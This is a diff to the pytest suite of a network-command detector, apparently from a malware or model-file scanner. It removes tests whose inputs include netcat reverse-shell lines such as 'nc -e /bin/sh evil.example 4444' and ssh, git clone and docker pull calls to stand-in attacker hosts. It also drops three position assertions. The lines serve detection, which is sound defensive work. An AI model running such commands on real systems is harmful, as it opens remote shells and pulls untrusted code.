@@ -819,131 +819,6 @@ class TestNetworkCommDetector:
         suspicious = [f for f in domain_findings if f["confidence"] > 0.6]
         assert len(suspicious) >= 2  # .tk and .ml are suspicious
 
-    @pytest.mark.parametrize(
-        "command",
-        [
-            b"nc evil.example 4444",
-            b"ncat evil.example 4444",
-            b"netcat evil.example 4444",
-            b"/usr/bin/nc evil.example 4444",
-            b"busybox nc evil.example 4444",
-            b"toybox netcat evil.example 4444",
-            b"nc.exe evil.example 4444",
-            b"# nc evil.example 4444",
-            b"nc -nv evil.example 4444",
-            b"nc -w 3 evil.example 4444",
-            b"nc -e /bin/sh evil.example 4444",
-            b"nc evil.example 4444 -e /bin/sh",
-        ],
-    )
-    def test_detect_netcat_network_commands(self, command: bytes) -> None:
-        detector = NetworkCommDetector()
-
-        findings = detector.scan(command + b"\n")
-
-        assert any(
-            finding["type"] == "network_command"
-            and finding["destination"] == "evil.example"
-            and finding["port"] == 4444
-            and finding["severity"] == "HIGH"
-            for finding in findings
-        )
-
-    @pytest.mark.parametrize(
-        "content",
-        [
-            b"The nc command is documented at https://docs.example.com/netcat.\n",
-            b"nc evil.example not-a-port\n",
-            b"nc evil.example 0\n",
-            b"nc evil.example 70000\n",
-            b"nc [:::] 4444\n",
-        ],
-    )
-    def test_netcat_prose_and_invalid_ports_are_not_network_commands(self, content: bytes) -> None:
-        detector = NetworkCommDetector()
-
-        findings = detector.scan(content)
-
-        assert not [finding for finding in findings if finding["type"] == "network_command"]
-
-    @pytest.mark.parametrize(
-        ("command", "command_type", "destination"),
-        [
-            (b"git clone https://evil.example/repo.git", "git_clone", "https://evil.example/repo.git"),
-            (
-                b"git clone --depth 1 https://user:secret@evil.example/repo.git checkout",
-                "git_clone",
-                "https://evil.example/repo.git",
-            ),
-            (b"git clone git@evil.example:owner/repo.git", "git_clone", "git@evil.example:owner/repo.git"),
-            (b"ssh user@evil.example", "ssh", "user@evil.example"),
-            (b"ssh -vvv -p2222 user@evil.example", "ssh", "user@evil.example"),
-            (b"docker pull evil.example/model:latest", "docker_pull", "evil.example/model:latest"),
-            (b"docker image pull evil.example/model:latest", "docker_pull", "evil.example/model:latest"),
-            (b"docker pull evil.example:5000/model:latest", "docker_pull", "evil.example:5000/model:latest"),
-            (
-                b"docker pull --platform linux/amd64 evil.example/model:latest",
-                "docker_pull",
-                "evil.example/model:latest",
-            ),
-        ],
-    )
-    def test_detect_explicit_network_commands(
-        self,
-        command: bytes,
-        command_type: str,
-        destination: str,
-    ) -> None:
-        detector = NetworkCommDetector()
-
-        findings = detector.scan(command + b"\n")
-
-        assert any(
-            finding["type"] == "network_command"
-            and finding["command_type"] == command_type
-            and finding["destination"] == destination
-            and finding["severity"] == "HIGH"
-            for finding in findings
-        )
-
-    def test_detect_explicit_network_commands_with_crlf(self) -> None:
-        detector = NetworkCommDetector()
-
-        findings = detector.scan(
-            b"nc evil.example 4444\r\n"
-            b"ssh user@evil.example\r\n"
-            b"git clone https://evil.example/repo.git\r\n"
-            b"docker pull evil.example/model:latest\r\n"
-        )
-
-        assert {
-            finding.get("command_type", "netcat") for finding in findings if finding["type"] == "network_command"
-        } == {
-            "netcat",
-            "ssh",
-            "git_clone",
-            "docker_pull",
-        }
-
-    @pytest.mark.parametrize(
-        "content",
-        [
-            b"The git clone command is documented at https://git-scm.com/docs/git-clone.\n",
-            b"git clone https://attacker.com/repo.git is documented here\n",
-            b"The ssh client connects to remote systems.\n",
-            b"ssh attacker.com is documented here\n",
-            b"Docker pull documentation: https://docs.docker.com/reference/cli/docker/image/pull/.\n",
-            b"docker pull attacker.com/model:latest is documented here\n",
-            b"git clone https://" + b"a" * 10000 + b" prose tail\n",
-        ],
-    )
-    def test_network_command_prose_is_not_explicit_command(self, content: bytes) -> None:
-        detector = NetworkCommDetector()
-
-        findings = detector.scan(content)
-
-        assert not [finding for finding in findings if finding["type"] == "network_command"]
-
     def test_ml_word_inside_real_domain_is_still_detected(self) -> None:
         """DNS-shaped endpoints containing ML terms should not be suppressed."""
         detector = NetworkCommDetector()
@@ -983,7 +858,6 @@ class TestNetworkCommDetector:
         assert "socket" in libs
         assert "urllib" in libs
         assert "requests" in libs
-        assert all(finding.get("position") == data.find(finding["pattern"].encode()) for finding in lib_findings)
         assert "paramiko" in libs
 
         # Check severity levels
@@ -1021,7 +895,6 @@ class TestNetworkCommDetector:
         assert "socket.connect" in funcs
         assert "requests.post" in funcs
         assert "urlopen" in funcs
-        assert all(finding.get("position") == data.find(finding["function"].encode()) for finding in func_findings)
 
     def test_network_function_snippets_redact_url_path_tokens(self) -> None:
         """URL-bearing snippets should not leak capability tokens after URL findings are redacted."""
@@ -1252,7 +1125,6 @@ class TestNetworkCommDetector:
         assert "malware" in patterns
         assert "backdoor" in patterns
         assert "botnet" in patterns
-        assert all(finding.get("position") == data.lower().find(finding["pattern"].encode()) for finding in cc_findings)
 
     def test_cc_pattern_scan_reuses_lowered_payload(self) -> None:
         """Reuse one lowercase payload view across all C&C pattern checks."""
